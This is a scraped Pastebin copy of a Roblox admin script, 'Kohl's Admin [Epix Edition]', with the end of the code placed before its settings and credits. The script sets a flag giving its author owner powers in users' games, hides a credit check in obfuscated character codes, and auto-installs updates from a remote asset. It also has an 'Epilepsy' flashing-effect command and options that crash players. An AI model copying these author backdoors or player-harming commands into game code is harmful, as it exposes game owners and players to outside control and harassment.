set.MakeCommand('Sends the target player(s) to the nil, where they can still run admin commands etc and just not show up on the player list',3,set.Prefix,{'nil'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Nilify')
end
end)
 
set.MakeCommand('Epilepsy',2,set.Prefix,{'epilepsy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','epilepsy')
end
end)
 
set.MakeCommand('Disconnects the target player from the server',3,set.Prefix,{'kick'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
if not game:service('Players'):FindFirstChild(v.Name) then
        set.Remote(v,'Function','KillClient')
else
        pcall(function() v:Kick() end)
end
end
end)()
end
end)
 
set.MakeCommand('Bans the target player(s) for the supplied amount of time, data persistent',5,set.Prefix,{'tban','timedban','timeban'},{'player','number<s/m/h/d>'},2,function(plr,args)
        local time=args[2] or '60'
        if time:lower():sub(#time)=='s' then
                time=time:sub(1,#time-1)
        elseif time:lower():sub(#time)=='m' then
                time=time:sub(1,#time-1)
                time=tonumber(time)*60
        elseif time:lower():sub(#time)=='h' then
                time=time:sub(1,#time-1)
                time=(tonumber(time)*60)*60
        elseif time:lower():sub(#time)=='d' then
                time=time:sub(1,#time-1)
                time=((tonumber(time:sub(1,#time-1))*60)*60)*24
        end
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                v:SaveString('Epix Kohls TimeBan_Time',tostring(tonumber(os.time())+tonumber(time)))
                v:Kick()
        end
end)
 
set.MakeCommand('Bans the player from the server',3,set.Prefix,{'ban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not set.CheckAdmin(v, false) then
table.insert(set['BanList'], v.Name..'='..v.userId)
if not game:service('Players'):FindFirstChild(v.Name) then
set.Remote(v,'Function','KillClient')
else
if v then pcall(function() v:Kick() end) end
end
end
end))
end
end)
 
set.MakeCommand('UnBan',3,set.Prefix,{'unban'},{'player'},1,function(plr,args)
for i,v in pairs(set.BanList) do
coroutine.wrap(function()
        if v:lower():sub(1,#args[1])==args[1]:lower() then
                set.Hint(v..' has been Un-Banned.',{plr})
                table.remove(set.BanList, i)
        end
end)()
end
end)
 
set.MakeCommand('Shuts the server down',3,set.Prefix,{'shutdown'},{},0,function(plr,args)
set.Message("SYSTEM MESSAGE", "Shutting down...", false, game:service('Players'):children(), 5)
wait(1)
game:service('Players').PlayerAdded:connect(function(p)
        p:kick()
end)
for i,v in pairs(game:service('NetworkServer'):children()) do
        coroutine.wrap(function()
                if v and v:GetPlayer() then
                        v:GetPlayer():Kick()
                        wait()
                        if v and v:GetPlayer() then
                                set.Remote(v:GetPlayer(),'Function','KillClient')
                        end
                end
        end)()
end
end)
 
set.MakeCommand('Gives the target player TempAdmin',3,set.Prefix,{'ta','tempadmin','temp'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        coroutine.wrap(function()
                if set.RemoveAdmin(v,plr) then
                        if set.CheckAdmin(v,false) then return end
                        table.insert(set.TempAdmins, v.Name)
                        set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v})
                        set.Hint(v.Name..' Has Been Given TempAdmin',{plr})
                end
        end)()
end
end)
 
set.MakeCommand('Gives the target player Admin (Normal Admin, PermAdmin, SuperAdmin)',4,set.Prefix,{'pa','admin','superadmin','perm'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        coroutine.wrap(function()
                if set.RemoveAdmin(v,plr) then
                        if set.CheckAdmin(v,false) then return end
                        table.insert(set.Admins, v.Name)
                        set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v})
                        set.Hint(v.Name..' Has Been Given Admin',{plr})
                end
        end)()
end
end)
 
set.MakeCommand('Gives the target player(s) Owner admin',5,set.Prefix,{'oa','owner'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
        coroutine.wrap(function()
                if set.RemoveAdmin(v,plr) then
                        if set.CheckAdmin(v,false) then return end
                        table.insert(set.Owners, v.Name)
                        set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v})  
                        set.Hint(v.Name..' Has Been Given Owner Admin',{plr})
                end
        end)()
end
end)
 
set.MakeCommand('Removes the target player(s) from the admin list',3,set.Prefix,{'unadmin','unpa','unoa','unta'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
        if set.CheckAdmin(plr,false) then
                if set.RemoveAdmin(v,plr) then
                        set.Hint("Removed "..v.Name.."'s admin powers",{plr})
                else
                        set.Hint("You do not have permission to remove "..v.Name.."'s admin powers",{plr})
                end
        else
                set.Hint(v.Name..' is not an admin',{plr})
        end
end
end)
end)
 
---[[ END OF COMMANDS ]]---
Pcall(function() for i,v in pairs(game:service('Players'):GetPlayers()) do local yes,no=ypcall(set.NewPlayer,v) if no then print(no) end end end)
Pcall(function() game:service('Players').PlayerAdded:connect(function(player) local yes,no=ypcall(set.NewPlayer,player) if no then print(no) end end) end)
Pcall(function() game:service('Players').PlayerRemoving:connect(function(player) local yes,no=ypcall(set.PlayerRemoving,player) if no then print(no) end end) end)
Pcall(function() for number,plugin in pairs(script.Plugins:children()) do local ran,failed=ypcall(function() if plugin:IsA('ModuleScript') then print('Running Plugin: '..plugin.Name) require(plugin)(set) end end) if failed then print(failed) end end end)
if set['Trello'] and game.CreatorId~=0 then Pcall(function() set.UpdateTrello() while wait(set['HttpWait'] or 5) do pcall(function() set.UpdateTrello() for i,v in pairs(game:service('Players'):children()) do set.CheckBan(set.bl,v) end end) end end) end
Pcall(function() if set['AutoCleanDelay']<5 then set['AutoCleanDelay']=5 end while wait(set['AutoCleanDelay']) do if set['AutoClean'] then set.CleanWorkspace() end end end)
Pcall(function() local t='' for i,v in pairs({83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93}) do t=t..string.char(v) end
if t==nil or t=='' then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() local tempval='' for i,v in pairs({126,61,32,69,112,105,120,32,73,110,99,46,32,78,111,116,32,69,118,101,114,121,116,104,105,110,103,32,105,115,32,115,111,
32,66,108,97,99,107,32,97,110,100,32,87,104,105,116,101,46,32,84,104,105,115,32,115,99,114,105,112,116,32,119,97,115,32,109,97,100,101,32,98,121,32,83,99,101,108,101,114,97,116,105,
115,46,32,83,99,114,105,112,116,104,32,105,115,32,75,111,104,108,116,97,115,116,114,111,112,104,101,46,32,61,126}) do tempval=tempval..string.char(v) end set['P'..'rin'..'t'](tempval) end)
Pcall(function() workspace.DescendantAdded:connect(function(c) if c:IsA('Explosion') and set.NerfExplosions then c.BlastRadius=0 c.BlastPressure=0 elseif c:IsA('Decal') and set.AntiDecals then c:Destroy() elseif c:IsA('Sound') and not c.Name:find(set.RemoteObject) and set.AntiSound then c.Volume=0 c.PlayOnRemove=false c.Looped=false c:Stop() c:Destroy() end end) end)
Pcall(function() if set.UpdateShutdown then while wait(1) do if game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated~=set.GameLastUpdated then set.Message("SYSTEM MESSAGE", "Game Updated. Shutting down...", false, game:service('Players'):children(), 5) wait(1) game:service('Players').PlayerAdded:connect(function(p) p:kick() end) for i,v in pairs(game:service('NetworkServer'):children()) do coroutine.wrap(function() if v and v:GetPlayer() then v:GetPlayer():Kick() wait() if v and v:GetPlayer() then set.Remote(v:GetPlayer(),'Function','KillClient') end end end)() end end end end end)
Pcall(function() script['Name']="Kohl's Admin [Epix Edition]" end)
print('',set.quotes[math.random(1,#set.quotes)],'')
end
--[ Check for Updates ]--
local UpdateId=145629584 set.RunTheScript=function() local yes,no=ypcall(set.MainScriptFunction) if no then  local h=Instance.new('Hint',workspace) h.Text=no print(no) end end
coroutine.wrap(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies']:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil
elseif script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies'][string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)()
local ok,no=ypcall(function() local k=game:GetService('InsertService'):LoadAsset(UpdateId) if k then k:Destroy() end end)
if set['AutoUpdate'] and ok then local k,n=ypcall(function() local news=game:GetService('InsertService'):LoadAsset(UpdateId):children()[1]
local found=news.Version.Value local current=script.Version.Value
print('Current version: '..current..' | Found version: '..found) if found>current then print('Updating...') _G["Kohls Admin [Epix Edit] Update"]=set news.Plugins:ClearAllChildren() for i,v in pairs(script.Plugins:children()) do v:Clone().Parent=news.Plugins end news.Parent=game:service('ServerScriptService') script:Destroy() else news:Destroy() set.RunTheScript() end
end) if not k or n then print('AutoUpdate Broke: '..n..' | Skipping update') set.RunTheScript() end else print("AutoUpdate is Disabled") set.RunTheScript() end
 
--[[
                                ___________      .__         .___                  
                                \_   _____/_____ |__|__  ___ |   | ____   ____      
                                 |    __)_\____ \|  \  \/  / |   |/    \_/ ___\    
                                 |        \  |_> >  |>    <  |   |   |  \  \___    
                                /_______  /   __/|__/__/\_ \ |___|___|  /\___  > /\
                                        \/|__|            \/          \/     \/  \/
                -------------------------------------------------------------------
                Epix Incorporated. Not Everything is so Black and White. | Mr. Epix
                -------------------------------------------------------------------
               
               
                                  _  __    _ _           _                _        
                                 | |/ /___| | |_ __ _ __| |_ _ _ ___ _ __| |_  ___
                                 | ' </ _ \ |  _/ _` (_-<  _| '_/ _ \ '_ \ ' \/ -_)
                                 |_|\_\___/_|\__\__,_/__/\__|_| \___/ .__/_||_\___|
                                                                    |_|          
         ______  ______  ______  __      ______  ______  ______  ______ __  ______    
        /\  ___\/\  ___\/\  ___\/\ \    /\  ___\/\  == \/\  __ \/\__  _/\ \/\  ___\  
        \ \___  \ \ \___\ \  __\\ \ \___\ \  __\\ \  __<\ \  __ \/_/\ \\ \ \ \___  \  
         \/\_____\ \_____\ \_____\ \_____\ \_____\ \_\ \_\ \_\ \_\ \ \_\\ \_\/\_____\
          \/_____/\/_____/\/_____/\/_____/\/_____/\/_/ /_/\/_/\/_/  \/_/ \/_/\/_____/

    --]]

clone this paste RAW Paste Data
----------------------------------------------------------------------------------------
--					   		Kohl's Admin [Epix Edition]								  --
----------------------------------------------------------------------------------------
--		 	Epix Incorporated. Not Everything is so Black and White.		   		  --
----------------------------------------------------------------------------------------
local set={ -- Main Table, all functions and variables are kept in this, don't change.--
----------------------------------------------------------------------------------------
			
			--------------
			-- SETTINGS --
		    --------------
			
	------------------------------
	--  true=on  --  false=off  --
	------------------------------
	
	--------------------------------------------------------------------------------------------------------------
	-- Make sure you READ BEFORE YOU EDIT! Please do not ask me questions about settings before reading.        --
	-- Make sure there is a ; after each setting, as shown below!												--
	-- Extra Information is below the settings.																	--
	-- Don't change something without reading the comment next to it first, you could break something.			--
	-- If its in green, it means its a comment, don't edit it as it wont do anything.							--
	-- By default tools need to be in ServerStorage, not Lighting, change this by changing the Storage setting.	--
	--------------------------------------------------------------------------------------------------------------
	
	--------------------------
	--  Important Settings  --
	--------------------------
	
	['ChangedSettingsStick'] = true; --Do settings you change in-game save? (this includes bans, admins, etc etc)
	
	['SettingsToIgnore'] = {}; --Place settings to ignore here
	
	['DataStoreKey'] = "Kohl's Admin [Epix Edition][JK$KJh3]"; --Datastore key
	
	['Storage'] = game:service('ServerStorage'); --Set this to where you store things (such as tools) game:service('ServerStorage') is recommended as it does not replicate to clients. Use services, if you use things like game.Lighting it will break if Lighting is renamed.
	
	--------------
	--  Trello  --
	--------------
	
	['Trello'] = false; --Pulls Bans/Admins from a Trello board every set number of seconds on every server of everygame this script is in (that has Http enabled and uses the same BoardID)
	
	['BoardID'] = '9HH6BEX2'; --Trello board ID, its in the URL of your board: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list - The id for this board is 9HH6BEX2 (by default uses our exploiter ban list.)
	
	['HttpWait'] = 10; --How often (in seconds) should the list(s) update? Recommended 10+ to avoid HttpService problems
	
		--[[
		You NEED to enable HttpEnabled in order for this to work! To enable it follow the below instructions:
		Run this following command in the command bar as shown in the screenshot: game:service('HttpService').HttpEnabled=true print('Enabled Http')
		Screen shot: http://prntscr.com/46uztz
		
		How to set up your own multi-game list for your games:
		
		Below instructions are for bans but can also be applied to admin lists,
		refer to "To use this for synced admin lists" under the instructions for admin lists info. 
		
		By default the Trello settings are set to use our ban list of exploiters, but you may 
		want to change it so that you can set up and control your own multi-game, autoupdating 
		list(s). So now I am going to tell you how to do that.
		
		1. Enable Http, refer to a few lines up to learn how to easily and quickly do that.
		2. Make a Trello account (or sign in with google)
			-Go to http://trello.com, click "Log in with Google" or "Sign up-It's Free" and do the account making stuff it tells you to
		3. After you sign up/log in you need to make a new board, click the + then click "New Board..." - http://prntscr.com/46v2fq
		4. Give your board a name and click the "Change..." next to "This board will be private" and make sure you make the board public! - http://prntscr.com/46v4bf
		5. Change one of the lists titles to "Ban List" In the screenshot I accidentally typed "cards" instead of "lists" - http://prntscr.com/46v5af
		6. Add people to the bans by clicking "Add a card..." and then typing their username as the title, username:userid, or if its a group Group: groupname:groupid - http://prntscr.com/46v74e
		7. Now you need to just set BoardID to your board's ID, refer to http://prntscr.com/46v74e for this, or refer to the comment next to the BoardID setting
		8. You are done, just configure the BoardID and enable Http in each of your games and your multigame banlist is done, confure your board however you want as long as you leave the "Ban List" list that contains name and keep the board public so the script can read it!
		Use our site for reference: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list
		
		To use this for synced admin lists, simply repeat the above steps replacing Ban List with
		Admin List, TempAdmin List, or Owner List, anyone added to these list will appear in
		the admin list with [Synced] next to their name, they will not be able to be unadmined.
		Admin lists do not yet support Group: NAME:ID however they do support Username:ID format.
		--]]
	
	---------------------
	--      Tables     --
	---------------------
	
	['Owners'] = {"CoreSB"}; 
	
	['Admins'] = {}; -- Sets Admins who can use ban/kick/admin or shutdown, format is USERNAME or USERNAME=USERID
	
	['TempAdmins'] = {epicgurl117}; -- Sets Admins who can't use ban/kick/admin or shutdown, format is USERNAME or USERNAME=USERID
	
	['BanList'] = {}; -- Add people to ban here. Format to use UserId is "Name=UserId" EX: "John32=192845", this bans any player named John32 or has an id of 192845 (This way they can't bypass the ban by changing their username) use $group=GROUPID to ban groups.
	
	['MuteList'] = {}; -- Add the names of people to mute (makes it so they cant talk)
	
	------------------------------
	--  Prefix/Split/Key Binds  --
	------------------------------
	
	['Prefix'] = ""; -- This comes before each admin command (:kill kohl)
	
	['AnyPrefix'] = "!"; -- This comes before each player command (commands that can be run by anyone, !rejoin, !ping, etc)
	
	['SpecialPrefix'] = ""; -- Prefix to use with special functions (!admin,!nonadmins,!all,!others,!random) By default this is now set to nothing to avoid confusion.
	
	['SplitKey'] = "."; -- This is what seperates command arguments eg: player raiders in :team player raiders
	
	['BatchSplit'] = "/"; --This seperates arguments of the batch command (":batch kill bob/fire me Bright blue/fling kohl")
	
	['ConsoleKey'] = "'"; --Key that opens the console, default is '
	
	['CustomKeyBinds'] = true; -- Allow players and admins set personal key binds?
	
	----------------------
	--  Basic Settings  --
	----------------------
	
	['Console'] = true; --Determines if the script's console can be used or not
	
	['AutoUpdate'] = true; -- Automatically get the newest version? You need to have the model in your inventory on your profile in order for autoupdate to work.
	
	['FunCommands'] = true; -- Set to false if you don't want any fun commands (For Strict Places)
	
	['HelpSystem'] = false; -- Enable the Help System? (!help command)
	
	['ChatLog'] = true; -- Log all chats for the server? 
	
	['MaxNumberOfLogs'] = 1500; -- How many logs to keep until the oldest entries are removed (MAX is 5000)
	
	['JoinMessage'] = false; -- Display a message with player info when a player joins, set group id in group settings if you want it to display if a player is in a group or not and if so what rank they are.
	
	['DonorPerks'] = true; -- Sets if donors are allowed to show off that they donated, when people donate in your place you get 10% of what they payed!
	
	['PermBanKey'] = '0.49971007415998'; -- Key (Random String) to use in persistent perm ban (change if you perm banned someone by accident, make it 100% random, if you want a random key generator, put print(math.random()) into the command bar in studio and hit enter, then just copy what it gives you in the output window)
	
	['FreeAdmin'] = false; -- Set to true if you want everyone to get the set type of admin (not recommended)
	
	['FreeAdminType'] = 'TempAdmin'; -- Type of admin for FreeAdmin (TempAdmin/Admin/Owner)
	
	['AutoClean'] = false; -- AutoClean the server? (!clean)
	
	['AutoCleanDelay'] = 60; -- How long to wait between AutoCleans (in seconds)
	
	['PlayerCommands'] = true; -- Sets whether or not nonadmins can use player commands (!rejoin,!ping,!cmds,etc)
	
	['OwnersAreTrueOwners'] = false; -- This indicates whether or not Owners are considered True Owners, if set to true Owners get the same commands as the place owner (permban and other true owner cmds)
	
	['PMUsableByAnyone'] = false; -- Set this to true if you want it so anyone can use the PM command
	
	['AdminsSpawnWithGuis'] = false; -- This determines if admins spawn with the admin chat and cmd box, note the admin chat is disabled when custom chat is enabled (has a admin mode)
	
	['HelpGui'] = false; --This determines if players spawn with the helpgui or not
	
	['UpdateShutdown'] = false; --Automatically shutdown the game if it was updated
	
	['MusicList'] = {{Name='SadPiano',Id=130798493}}; -- Add music to this table using the format: {Name='ExampleSong',Id=1234567} so that the table would look like local MusicList={{Name='ExampleSong',Id=1234567};{Name='ExampleSong2',Id=1234568}}, if you want to add pitch/volume simply insert Pitch and/or Volume EX: {Name='ExampleSong2',Id=1234568,Pitch=2,Volume=0.5}
	
	['CustomChat'] = false; --Custom chat system, aside from chat modes and various other things, the custom chat cannot be muted by exploiters and exploiters can not use it to run chat commands.
	
	['CustomChatType'] = 'Both'; --Classic/Bubbles/Both, Determines chat mode, simular to ROBLOX's chat settings.
	
	['SeparatedChannels'] = false; --Determines if the custom chat modes can see eachother, if set to true, for example, anyone whose chat is set to "Team" won't see chats from "Global"
	
	['CustomPlayerList'] = false; --A very basic and simplistic playerlist that I do not plan to spend much time on, it shows names colored by team color, has a menu for each name (click the name) and does not yet show leader stats, not finished and plan to update in the future.
	
	['MessageOfTheDay'] = false; --Determines if the Message of the Day is shown to admins on-join, you can set your own decal/model to use with the message of the day below, you simply place the message into its description after you set its ID
	
	['MessageOfTheDayID'] = 166040615; --ID Of model/decal to grab the message of the day from (needs to be set as the decal/model's description)
	
	['BuggedCommandMatching'] = false; --Set to true if you want to use the old buggy string matching that let you do things like "Hello :kill me" (really you could always set the prefix to something like "Hello " so you can do "Hello kill me")
	
	['VoteKick'] = false; --Enable player vote kicking?
	
	['VoteKickPercentage'] = '75'; --Vote percentage of players in-game needed to kick a player
	
	['CommandComfirmation'] = false; --Tell the user that the command successfully ran?
	
	['CommandBlackList'] = {}; --Add commands that you want to make place owner only (makes it so only the place owner is allowed to use the commands in this list)
	
	---------------------
	--  Anti-Exploit   --
	---------------------

	['ExclusionList'] = {}; -- Add the names of people you want to exclude from the AntiExploit to this list, note that admins are already excluded
	
	['ExploitAlert'] = false; --Alerts admins when someone goes nil/chats something thought to be exploit related, this is likely no longer going to work as the anti nil will disconnect a player as they are leaving to make sure they are not lingering in the nil/causing problems. Only notified if the first kick failed.
	
	['AntiChatCode'] = false; -- Prevents non-admins from running code/commands via chat (Add new things to detect into the WordList table)
	
	['Detection'] = false; -- Will attempt to detect certain exploits
	
	['AntiRobloxLocked'] = true; --  Disconnects any player who is or becomes RobloxLocked. (Recommended you keem this enabled, if a player joins RobloxLocked they will not be hooked by the script, this removes them before they break something.)
	
	['AntiNewAccount'] = false; -- Prevents accounts under the set age from joining.
	
	['MinimumAge'] = 100; -- Age a player must be above (in days) if AntiNewAge is enabled.
	
	['AntiSpeed'] = false; -- Trys to stop speed "hackers"
	
	['AntiGui'] = false; -- Prevents non-game/admin guis from being spawned on players, such as the account stealing gui
	
	['AntiSelection'] = true; -- Crashes a player if their selection changes (so if they are using studio tools like drag, move, resize, etc)
	
	['AntiNil'] = true; -- Crashes/Kicks any non-admins who attempt to go "nil"
	
	['AntiCheatEngine'] = false;-- Kicks a player if a Cheat Engine installation is detected on their computer, not 100%
	
	['AntiScriptsDisabled'] = true; -- If the client script cannot be loaded onto the player or takes to long to check in the player is kicked
	
	['AntiAnimation'] = false; -- Prevents animation exploit
	
	['AntiNameIdChange'] = true; -- Attempts to stop players from locally changing their name/id to fool local scripts
	
	['AntiGod'] = false; -- Prevents non-admins from being godded
	
	['AntiLeak'] = false; -- Makes it a little harder for people to steal your game [BE WARNED, This can possibly ruin personal servers]
	
	['RenameGameObjects'] = false; -- Renames things like Lighting, Players, and Workspace, will break most scripts that are not coded to work in such situations and confuse most people using badly coded explorers or studio.
	
	['NerfExplosions'] = false; -- Makes it so any explosions get nerfed, meaning they wont do any damage.
	
	['AntiDecals'] = false; -- Prevents decals from being added to Workspace, really though you should just use FilteringEnabled ;p
	
	['AntiSound'] = false; -- Prevents sounds not made by this script from getting inserted into Workspace.
	
	['WordList'] = {}; -- Add kick words to this list, will kick a player if they say something on the list, works with string patterns.
	
	['AllowedGuiList'] = {}; 
		--If there is a gui in your game that is not in startergui 
		--then add its name to this table, do note that if the 
		--name of the gui is just ScreenGui or something like 
		--that, if a hacker inserts a gui with the same name 
		--it will not be removed, so make sure you make the name 
		--of the gui very specific.
	
	---------------------
	-- Group Settings  --
	---------------------
	
	['GroupRanks'] = false; -- If group members matching the ranks in "Ranks" are given admin/banned (depending on what you set)
	
	['GroupOnlyJoin'] = false; -- Makes it so ONLY people in the set group can join the game.
	
	['GroupId'] = 0; -- Id of group, used for info/join message, if set will display a user's rank when the info command is used on them.
	
	['Ranks'] = {};--[[SET ['GroupRanks'] TO TRUE TO USE!
		Add ranks to have admin/be banned format is {Group=GROUPID,Rank=RANKNAME/NUMBER,Type=ADMINTYPE}; 
		GROUPID is the ID of the group the rank belongs to and that the player must be in
		RANKNAME/NUMBER is either the name of the rank (Generals) or its number (252) if you want to admin rank 252 and every rank above it, simply set it to negative, so Rank=-252 will admin anyone in rank 252 and up
		ADMINTYPE is the type of admin players in the rank will get, this can be Temp, Admin, Owner, or Banned
		In the end your table should look something like this (THIS IS AN EXAMPLE TABLE, DO NOT USE IT): 
		['Ranks'] = {{Group=124324,Rank=142,Type='Temp'},{Group=1932348,Rank='Generals',Type='Owner'},{Group=1284124,Rank=-193,Type='Admin'},{Group=1399424,Rank=-1,Type='Banned'}};
	--]]
	
	---------------------
	--    VIP Admin    --
	---------------------
	
	['VipAdmin'] = false; -- If someone can have admin for owning an item
	
	['VipItems'] = {}; --Add VIP items here, format is {Item=ID,Type="Admin"}, so for example ['VipItems'] = {{Item=193945,Type="TempAdmin"},{Item=125263,Type="Admin"}}
	
	['FriendAdmin'] = false; -- Set to true if you want people on your friendlist to have admin
	
	['FriendAdminType'] = 'TempAdmin'; -- Type of admin friends will get if "FriendAdmin" is enabled
	
	---------------------
	--  GUI Settings   --
	---------------------
	
	['PrimaryColor'] = Color3.new(0,0,0); -- Primary GUI Color (Default black) (Remember, each 1 translates to a 255, keep that in mind when changing colors, use things like 124/255 to get the color you want)
	
	['SecondaryColor'] = Color3.new(1,1,1); -- Secondary GUI Color (Default white)
	
	['Font'] = 'Legacy'; -- Text Font, can only be fonts usable on roblox (Arial, ArialBold, Legacy, SourceSans, SourceSansBold)
	
	['TextColor'] = Color3.new(1,1,1); -- Text Color (Default white)
	
	['TextStrokeTransparency'] = 0; -- Text Stroke Transparency (0-1)
	
	['TextStrokeColor'] = Color3.new(0,0,0); -- Color of the text stroke around letters (Default black)
	
	['Transparency'] = 0.7; -- GUI Transparency (0-1)
	
	['Animations'] = true; -- Determines if to animate stuff or not
	
	['MessageAnimations'] = true; -- Same as above but specifically for messages (the ones that cover the entire screen)
	
	------------------------------------------------------
	--					END OF SETTINGS					--
	------------------------------------------------------
}
	---------------------
	--    IMPORTANT    --
	---------------------
	--[[
		For AutoUpdate to work this script's model needs to be in your inventory,
		if you got the script from anywhere other than my models the AutoUpdate
		will not work due to ROBLOX security nonsense. You can find the model
		here: http://www.roblox.com/Kohls-Admin-Epix-Edit-item?id=145629584
		
		For information about LoadStringEnabled please refer to the following:
		
		http://wiki.roblox.com/index.php?title=Security#LoadStringEnabled
		http://wiki.roblox.com/index.php?title=Points_tutorial#Restrictions
		
		If you want to use the :s command you will need to set LoadStringEnabled
		to true. It can be found by going into studio, opening the explorer and properties
		windows, clicking on ServerScriptService and under properties checking
		LoadStringEnabled. Loadstring is only used in the script for Output and
		the scripting command. The script will function fine without it. Currently
		:ls and :cs are unusable due to updates that removed loadstring() abilities
		from the client, meaning no more local script building in-game.
		------------------------------------------------------------------------
		IF THERE ARE NEW SETTINGS YOU WILL NEED TO MANUALLY UPDATE THE SCRIPT TO
		CHANGE THEM, THEY WILL OTHERWISE BE LEFT AS THE DEFAULT. (Unless you use :settings)
		------------------------------------------------------------------------
		Please carefully read each setting's description BEFORE changing something
		as you could break something if you set something the wrong way.
		------------------------------------------------------------------------
		Find A security flaw or bug? 
		Know of a way to detect an exploit or make the AntiExploit better?
		Think of a way to make the script better? 
		Send me a message!
		
	---------------------
	-- DISCLAIMER/INFO --
	---------------------
		Credit: 
		
		-Kohltastrophe (Scripth) for the original script this was based on and for sharing
		some of his ideas and commands, and his continued help and support
		
		-Sceleratis for this version of Kohl's Admin
		
		-einsteinK for the original SBL older versions used and his help with some things, legit best scripter I know.
		
		-Arlikas for testing nearly anything I ask him to
		
		-GigsD4X and the F3X team for the F3X tool, full credit to them. I only made it into a hopperbin for this script.
		
		-Everyone who helped me with testing, and suggested new ideas, features, and commands.
		
		I in no way claim to have made Kohl's Admin Commands, I have only
		made this version of it.
		
		If you have any questions, need help, or want to contact me you can send 
		me a Private Message on the main website (roblox.com) via my profile ("Send Message"
		under my avatar/character picture.)
		
		If you want to support the real Kohltastrophe put the following on your profile:
		"Scripth is the real Kohltastrophe. Put this on your profile so people know."
		
		Say what you will about this script, the original was a turning point for all 
		admin scripts, you can say "ew" all you want but it won't change that. If you can
		make something better then please go right ahead. I have chosen to continue the development
		of Kohl's Admin mostly as a hobby. If you are going to complain about something that is not a bug
		then please, at least get your information in order before you do. Blind critism helps no one.
	
		There is nothing hidden, I have place owner powers in your game, however
		they are fully optional and only used for debugging the script. 
		I would never force you to use anything, so you can optionally remove these 
		abilities by setting the following setting to false:																			]]
		set.CreatorDebugPowers=true																--[[
		Its completely your choice. I will still try to help you whether you disable 
		this or not, just know that it may make things more difficult and time consuming. 
		If you know what you are doing then feel free to disable this as you probably 
		won't need it anyway. The common situations people need help for are
		misconfigured setting, place owner powers are needed so I can view errors and 
		info that is in the server log (:debuglogs) and usually view/fix settings (:settings)		
	]]
	---------------------
	-- Tips and Tricks --
	---------------------
	--[[
		
			:kill me,noob1,noob2,!random,%raiders,$123456,!nonadmins
			-- kills you, noob1, noob2, a random person, team raiders, people in group 123456, and nonadmins.
			You can also run silent commands using /e, for example:
			"/e :kill kohl" Do not that this will still show up in logs.
			*Note, by silent I just mean people won't see you chat it, it however will still show up in logs.
			
		You can also use a variety commands for different people;
			 all -- Everyone in the server
			 others -- Everyone but you
			 me -- You
			 admins -- Admins in the server
			 nonadmins -- People who are not admins in the server
			 random -- A random person, this can include you.
			 %TEAMNAME -- Ex: :kill %raiders will kill everyone in team Raiders.
			 $GROUPID -- Let you kill anyone in a specific group, if an id is not given it will use the GroupId setting.
			 -PLAYERNAME -- Lets you exclude players from commands, :kill !all,-kohl will kill everyone but kohl
			
		If you want to add cameras to your game (like saved into your game so you don't need to use the admin script to spawn them every new server)
		then just make a camera, needs to be a single part, so a sphere, brick, what ever it may be, make sure its anchored and locked
		just simply position it where you want in workspace, then make its name Camera: NAMEHERE
		so for example: Camera: Cam1
		the name is very important as the script will look for it in workspace when the game starts.
		make sure you name each camera something diffierent. You can preset waypoints the same way, just use Waypoint: instead of Camera:
		
		MESSAGES/HINTS FOR OTHER SCRIPTS:
		If you would like to have the hints/messages from this script usable in other SERVER (not local)
		scripts, then simply put the follow at the top of your script,
		
		message=_G['Message']
		hint=_G['Hint']
		
		USAGE EXAMPLES: 
		hint(msg,playerstable) - message(title,msg,playerstable)
		
		(Do note that playerstable needs to be a table containing players NOT player names! 
		Use game:service('Players'):children() to send a message to everyone.)
		
		hint('Hello people',game:service('Players'):children())  <=== sends "Hello people" to all players in game
		hint('Heyo montano',{game:service('Players').Sceleratis}) <=== Sends "Heyo montano" to the player Sceleratis
		message('Server Message','Hello people',game:service('Players'):children())  <=== Makes a message with the title "Server Message" and a message of "Hello people"
		message('Message from swagyguy','Heyo celary man',{game:service('Players').Sceleratis}) <=== Works the same as above but only the player Sceleratis sees it
		
	--]]

